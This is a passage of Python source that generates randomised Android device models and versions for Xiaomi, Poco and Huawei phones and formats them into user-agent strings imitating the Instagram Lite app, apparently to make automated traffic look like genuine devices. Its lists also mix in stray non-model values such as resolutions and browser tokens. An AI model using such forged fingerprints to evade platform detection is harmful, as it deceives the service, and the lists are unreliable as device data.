'23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Xiaomi; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Poco':
                    self.android_version = random.choice(['11', '10', '12'])
                    self.device_model = random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Xiaomi/POCO; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Huawei':
                    self.android_version = random.choice(['11', '10', '9'])
                    self.device_model = random.choice(['POT-AL00a', 'POT-TL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'Huawei Ascend', 'U9500', 'U9500', 'U9500', 'U9500', 'U9500', 'U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'U8818', 'U8818', 'U8818', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'HUAWEI G6-L11', 'G620S-L01', 'C8817D', 'G620S-L03', 'G620S-L01', 'C8817D', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G7-L01', 'HUAWEI G7-L01', 'Huawei G700', 'HUAWEI G700-U20', 'HUAWEI G700-T00', 'HUAWEI G700-U10', 'Huawei g700', 'HUAWEI G700-U00', 'HUAWEI G700-T00', 'HUAWEI G700-U20', 'HUAWEI G700-U10', 'HUAWEI G700-U00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI MT1-U06', 'HUAWEI MT1-U06', 'HUAWEI MT2-L01', 'HUAWEI MT2-L01', 'HUAWEI MT2-C00', 'HUAWEI MT2-C00', 'MT2L03', 'MT2L03', 'HUAWEI Y360', 'HUAWEI MT7-L09', 'HUAWEI MT7-TL10', 'HUAWEI MT7-TL00', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-1', 'U9202L-1', 'U9202L-4', 'U9202L-2', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-2', 'HUAWEI P6 S-U06', 'HUAWEI P7-L10', 'Flow', 'H1711', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'HUAWEI Y221-U12', 'HUAWEI Y221-U03', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'Bucare Y330-U05', 'Bucare Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'Y550-L03', 'HUAWEI Y560-L01', 'HUAWEI Y541-U02', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'Huawei Blaze', 'Huawei BLAZE', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199s', 'HUAWEI C199s', 'HW-HUAWEI C199s', 'EC6109V1', 'MTS-SP101', 'MTS-SP101', 'MTS-SP101', 'C8512', 'C8600', 'C8600', 'C8600', 'C8600', 'C8650', 'C8650', 'C8650', 'HUAWEI C8655', 'HUAWEI C8655', 'C8800', 'HW-HUAWEI_C8810', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI_C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812E', 'HUAWEI_C8812E', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813DQ', 'HUAWEI C8813DQ', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8815', 'HUAWEI C8815', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI_C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI-C8850', 'HUAWEI C8860E', 'HUAWEI C8860E', 'HUAWEI C8860E', 'C8860V', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'CM980', 'CM980', 'd-02K', 'd-02H', 'd-01J', 'U9510', 'U9510', 'HUAWEI D2', 'Huawei D2', 'HUAWEI D8950D', 'MediaPad 10 FHD', 'dtab01', 'EC6108V9-01', 'ART-AL00x', 'ART-AL00x', 'ART-AL00x', 'ART-TL00x', 'ART-AL00m', 'ART-AL00x', 'STK-AL00', 'STK-AL00', 'STK-AL00', 'STK-TL00', 'MED-TL00', 'MED-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-TL00', 'WKG-AN00', 'WKG-AN00', 'WKG-TN00', 'WKG-TN00', 'FRL-TN00', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-TN00', 'FRL-AN00a', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'DVC-AN20', 'DVC-AN20', 'DVC-AN20', 'DVC-TN20', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'MLD-AL00', 'MLD-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'HUAWEI TAG-L01', 'HUAWEI TAG-L32', 'HUAWEI TAG-AL00', 'HUAWEI TAG-L21', 'HUAWEI TAG-L13', 'HUAWEI TAG-L03', 'NCE-TL10', 'NCE-AL10', 'NCE-AL00', 'NCE-TL10', 'NCE-AL00', 'NCE-AL10', 'DIG-TL10', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'SLA-TL10', 'SLA-AL00', 'SLA-TL10', 'SLA-TL10', 'TRT-AL00A', 'TRT-TL10A', 'FIG-AL10', 'FIG-TL10', 'FIG-AL00', 'FIG-TL00', 'FIG-AL10', 'LDN-TL20', 'LDN-AL20', 'LDN-AL10', 'LDN-TL00', 'LDN-TL20', 'FLA-AL10', 'FLA-AL10', 'FLA-AL10', 'ATU-AL10', 'DUB-AL00a', 'DUB-AL00a', 'DUB-AL00a', 'MRD-AL00', 'Huawei Enjoy 9s', 'Huawei Enjoy 9s', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'CM990', 'CM990', 'CM990', 'U8665', 'HUAWEI U8665', 'U8665', 'G735-L03', 'G735-L23', 'G735-L12', 'G735-L23', 'G735-L23', 'CHC-U03', 'CHC-U01', 'Huawei G500 pro', 'HUAWEI G510', 'HUAWEI G510', 'Huawei G510', 'Huawei G520', 'HUAWEI G520 T', 'HUAWEIG520L', 'HUAWEI G520T', 'Huawei G530', 'Huawei G600', 'Huawei G610 u20', 'Huawei G610', 'HUAWEI G610', 'HUAWEI G610 fa', 'HUAWEI G620', 'G621-TL00', 'G621-TL00M', 'G621-TL00', 'HUAWEI G628', 'HUAWEI G7', 'HUAWEI RIO-TL00', 'HUAWEI RIO-UL00', 'HUAWEI_G750', 'Huawei_g750', 'HUAWEI G750', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'Huawei G760', 'HUAWEI RIO-L01', 'HUAWEI VNS-AL00', 'HUAWEI VNS-TL00', 'HUAWEI MLA-TL00', 'HUAWEI MLA-TL00', 'HUAWEI G9 Youth', 'DIG-L21', 'DIG-L22', 'HUAWEI KII-L21', 'BLL-L22', 'BLL-L21', 'BLL-L21', 'HUAWEI NMO-L31', 'HUAWEI RIO-L03', 'H1611', 'H1611', 'H1621', 'H1621', 'HUAWEI H1621', 'H1623', 'H710VL', 'H715BL', 'H866C', 'H866C', 'H866C', 'H866C', 'H866C', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'HUAWEI H868C', 'HUAWEIH868C', 'HUAWEI H868C', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI_H881C', 'H882L', 'H882L', 'HUAWEI H891L', 'HUAWEI H892L', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'HUAWEI U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'COL-L29', 'COL-AL10', 'COL-L29', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-AL00', 'HRY-AL00a', 'HRY-LX1T', 'HUAWEI U9508', 'HUAWEI U9508', 'HUAWEI U9508', 'YAL-L21', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-L41', 'YAL-L41', 'HRY-AL00T', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00T', 'HRY-AL00Ta', 'YAL-AL50', 'MAR-LX1H', 'MAR-LX1H', 'BMH-AN20', 'BMH-AN10', 'BMH-AN10', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-TN00', 'MXW-AN00', 'MXW-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN10', 'EBG-AN10', 'LRA-LX1', 'CDY-NX9A', 'CDY-AN95', 'CDY-AN90', 'HONOR H30-L01M', 'H30-U10', 'H30-T10', 'H30-T00', 'H30-C00', 'Hol-U19', 'Hol-U19', 'Hol-U19', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'SCL-AL00', 'SCL-TL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-CL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-AL00', 'CHM-U01', 'Honor 4c Pro', 'Honor 4c pro', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'Che1-CL20', 'Che2-UL00', 'Che2-TL00M', 'CHE2-TL00', 'CHE-TL00', 'Che1-CL10', 'Che2-TL00', 'CHE-TL00H', 'Che2-L11', 'CUN-AL00', 'CUN-TL00', 'CUN-TL00', 'NTH-AN00', 'NTH-NX9', 'NTH-AN00', 'NTN-L22', 'NTN-LX3', 'NTN-LX1', 'RNA-AN00', 'JLH-AN00', 'JLH-AN00', 'CAM-AL00', 'CAM-TL00', 'CAM-AL00', 'NEM-AL10', 'NEM-L51', 'NEM-UL10', 'NEM-L51', 'NEM-L22', 'KIW-L21', 'KIW-AL10', 'KIW-UL00', 'KIW-TL00', 'H60-L02', 'H60-L04', 'H60-L01', 'H60-L02', 'H60-L03', 'H60-L11', 'H60-L01', 'MYA-TL10', 'huawei mya-tl10', 'PE-UL00', 'PE-TL20', 'PE-UL00', 'PE-TL10', 'PE-UL00', 'PE-TL10', 'GIA-AN00', 'DLI-TL20', 'DLI-L22', 'DLI-L42', 'DIG-L21HN', 'JMM-L22', 'BLN-L21', 'BLN-L22', 'BLN-AL10', 'BLN-AL10', 'BLN-AL30', 'PLK-AL10', 'PLK-UL00', 'PLK-L01', 'PLK-AL10', 'PLK-TL01H', 'PLK-UL00', 'NEM-L21', 'FNE-AN00', 'FNE-AN00', 'FNE-NX9', 'AUM-AL20', 'AUM-L33', 'AUM-AL00', 'AUM-TL20', 'AUM-AL20', 'AUM-L29', 'AUM-L41', 'LND-AL30', 'LND-L29', '720x1358', 'ATH-AL00', 'ATH-CL00', 'ATH-TL00H)', 'ATH-UL00)', 'ATH-AL00', 'ATH-AL00', 'ATH-AL00', 'ATH-TL00H', 'DUA-L22', 'DUA-LX3', 'BND-AL10', 'BND-L21', 'FRD-L09', 'FRD-AL00', 'FRD-L19', 'PRA-AL00X', 'PRA-TL10', 'DUK-L09', 'VEN-L22', 'JAT-L29', 'JAT-LX3', 'JAT-LX1', 'JAT-L41', 'BKK-AL10', 'BKK-LX2', 'BKK-L21', 'BKK-LX2', 'KSA-LX9', 'KSA-LX9', 'JSN-L21', 'JSN-L22', 'JSN-AL00a', 'JSN-L23', 'ARE-AL00', 'ARE-L22HN', 'STF-L09', 'STF-L09S', 'STF-AL10', 'STF-AL10', 'STF-AL00', 'LLD-L31', 'LLD-AL10', 'MOA-LX9N', 'U', '720x1470', 'AKA-L29', 'LLD-AL20', 'LLD-AL30', 'LLD-AL20', 'LLD-AL20', 'DUA-LX9', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00a', 'HLK-AL00', 'HLK-L42', 'HLK-AL10', 'HLK-L41', 'HLK-AL10', 'HLK-AL10', 'CAM-UL00', 'CAM-UL00', 'NTS-AL00', 'NTS-AL00', 'NTS-AL00', 'TNY-AL00', 'TNY-TL00', 'TNY-AL00', 'TNY-AL00', 'ELZ-AN10', 'ELZ-AN20', 'ANY-LX1', 'LGE-NX9', 'LGE-AN10', 'LGE-AN20', 'MGI-AN00', 'PGT-N19', 'RVL-AL09', 'RVL-AL09', 'RVL-AL09', 'EDI-AL10', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'ANA-AL00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-NX9', 'JDN-W09', 'JDN-AL00', 'JDN-W09', 'AGR-W09HN', 'COR-L29', 'COR-AL10', 'KOZ-AL00', 'KOZ-AL00', 'KOZ-AL00', 'HJC-LX9', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'KSA-AL10', 'huawei ksa-al10', 'TNNH-AN00', 'TNNH-AN00', 'TNNH-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'CHM-TL00', 'CHM-UL00', 'HW-CHM-CL00', 'CHM-UL00', 'CHM-TL00H', 'CHM-UL00', 'CHM-TL00H', 'CHM-TL00', 'CHM-UL00', 'AKA-AL10', 'HJC-AN90', 'NEW-AN90', 'KOZ-AL40', 'KOZ-AL40', 'DUA-AL00', 'DUA-TL00', 'JAT-AL00', 'MOA-AL00', 'MOA-AL00', 'JDN2-AL00HN', 'JDN2-W09HN', 'AGS2-AL00HN', 'BKL-L09', 'BKL-AL20', 'BKL-AL00', 'PCT-TL10', 'PCT-AL10',\
                                                        'PCT-AL10', 'ALA-AN70', 'KNT-AL10', 'KNT-AL20', 'KNT-AL20', 'KNT-UL10', 'KNT-TL10', 'DUK-AL20', 'DUK-AL20', 'DUK-AL20', 'JMM-AL00', 'JMM-AL10', 'JMM-TL10', 'JMM-AL00', 'BKL-L04', 'PCT-L29', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN10', 'OXF-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00', 'TEL-AN00a', 'TEL-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-TN00', 'TEL-AN10', 'Honor X10 Lite', 'DNN-LX9', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'Honor X10 Max', 'Honor X10 Pro', 'KKG-AN70', 'TFY-AN00', 'ADT-AN00', 'ADT-AN00', 'DIO-AN00', 'VNA-LX2', 'VNE-LX2', 'VNE-LX1', 'VNE-LX3', 'CMA-LX1', 'CMA-LX2', 'RKY-LX1', 'RKY-LX2', 'RKY-LX3', 'TFY-LX2', 'TFY-LX1', 'TFY-LX3', 'VNE-N41', 'CRT-LX1', 'CRT-LX3', 'CRT-LX2', 'ANY-LX2', 'ANY-LX3', 'ANY-NX1', 'RMO-NX1', 'RMO-NX1', 'HUAWEI SCL-L01', 'HUAWEI SCL-L21', 'HUAWEI LYO-L21', 'LYO-L21', 'Y538', 'Y538', 'Ideos', 'Ideos', 'IDEOS S7', 'IDEOS S7 Slim', 'IDEOS S7 Slim', 'Huawei Ideos X1', 'IDEOS X1', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8510', 'rv:35.0', 'rv:13.0', 'U8510', 'Huawei U8510', 'Huawei IDEOS X3', 'Huawei U8510 X3', 'HUAWEI U8510', 'u8800', 'U8800', 'U8800', 'U8800', 'Huawei Ideos X5', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'Huawei IDEOS X8', 'JNY', 'HUAWEI_M2', 'HUAWEI-M391', 'M650', 'M650', 'M650', 'M660', 'M660', 'M660', 'M660', 'Android 2.3.6', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'Android 2.2.2', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'Huawei M865', 'USCCADR3305', 'USCCADR3305', 'M865', 'USCCADR3305', 'M865', 'M865', 'M865', 'M865', 'Android 2.3.6', 'M865C', 'M865C', 'M865C', 'M865C', 'USCCADR3310', 'USCCADR3310', 'USCCADR3310', 'M866', 'HUAWEI M866', 'USCCADR3310', 'M866', 'HUAWEI M866', 'M866', 'USCCADR3310', 'HUAWEI M868', 'HUAWEI M881', 'HUAWEI M881', 'M886', 'M886', 'M886', 'M886', 'M886', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M921', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI MLA-AL10', 'HUAWEI MLA-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'ALP-AL00', 'ALP-L29', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'RNE-L21', 'RNE-L01', 'RNE-L23', 'BLA-L29', 'BLA-L09', 'BLA-A09', 'BLA-AL00', 'HMA-L29', 'HMA-L09', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-L29', 'SNE-LX1', 'SNE-LX3', 'LYA-L29', 'LYA-L09', 'LYA-AL00', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'EVR-AN00', 'EVR-AL00', 'EVR-AN00', 'EVR-L29', 'EVR-AL00', 'EVR-AL00', 'EVR-N29', 'TAS-AL00', 'TAS-AL00', 'TAS-L29', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'LIO-L29', 'LIO-AN00', 'LIO-L29', 'LIO-AN00', 'LIO-AL00', 'LIO-AN00', 'LIO-AN00', 'LIO-AL00', 'LIO-N29', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'Mate30 RS', 'LIO-AN00P', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'NOH-AL10', 'NOH-NX9', 'NOH-AN00', 'NOH-AN00', 'NOH-AL10', 'NOH-AN01', 'NOH-AN00', 'NOH-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'Mate 40 RS', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'CET-AL00', 'CET-LX9', 'CET-AL00', 'HUAWEI Mate 50', 'CET-AL00', 'DCO-AL00', 'CET-AL60', 'CET-AL60', 'HUAWEI MATE 7', 'HUAWEI NXT-AL10', 'HUAWEI NXT-L29', 'MHA-L29', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-L09', 'BLL-L23', 'LON-L29', 'LON-AL00', 'LON-AL00-PD', 'LON-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-L29', 'HUAWEI CRR-UL00', 'HUAWEI CRR-L09', 'HUAWEI CRR-UL20', 'HUAWEI CRR-CL00', 'BND-L34', 'TAH-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN10', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'PAL-LX9', 'PAL-AL00', 'PAL-AL00', 'PAL-AL00', 'HUAWEI Mate30', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'MON-AL19', 'MON-W19', 'GOT-AL09', 'GOT-AL09', 'GOT-AL09', 'GOT-W29', 'GOT-W29', 'AGS3-L09', 'HUAWEI MediaPad', 'HUAWEI MediaPad', '403HW', 'HUAWEI MediaPad', 'S8-306L', 'HUAWEI MediaPad', 'Huawei MediaPad', 'X1 7.0', 'Huawei MediaPad', 'S8-701w', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MON-AL19B', 'MON-AL19B', 'MON-AL19B', 'BTV-DL09', 'BTV-W09', 'BAH-W09', 'CPN-L09', 'CPN-AL00', 'CPN-W09', 'BAH-L09', 'BAH2-W19', 'JDN2-L09', 'BAH2-L09', 'BAH2-AL10', 'AGR-L09', 'KOB2-L03', 'T1-A21w', 'T1-A21L', 'T1-A23L', 'T1-701u', 'T1-701u', 'T1-823L', 'T1-823L', 'T1-821w', 'MediaPad T1 8.0', 'AGS-W09', 'AGS-L09', 'AGS-L03', 'BG2-U01', 'BG2-W09', 'KOB-L09', 'BZK-L00', 'KOB-W09', 'AGS2-L09', 'AGS2-W09', 'GEM-701L', 'GEM-703L', 'GEM-702L', 'Nexus 6P', 'Nexus 6P', 'HUAWEI CAN-L11', 'HUAWEI CAN-L12', 'HUAWEI CAN-L01', 'HUAWEI CAZ-AL10', '1080x1788', 'NCO-LX1', 'NCO-AL00', 'GLA-LX1', 'GLA-AL00', 'PIC-TL00', 'PIC-LX9', 'PIC-AL00', '704HW', 'BAC-L03', 'BAC-TL00', 'BAC-L01', 'BAC-TL00', 'BAC-AL00', 'BAC-L22', 'BAC-L21', 'BAC-AL00', 'BAC-L21', 'RNE-L22', 'HWI-AL00', 'HWI-AL00', 'HWI-AL00', 'HWI-TL00', 'HWI-AL00', 'PAR-LX1', 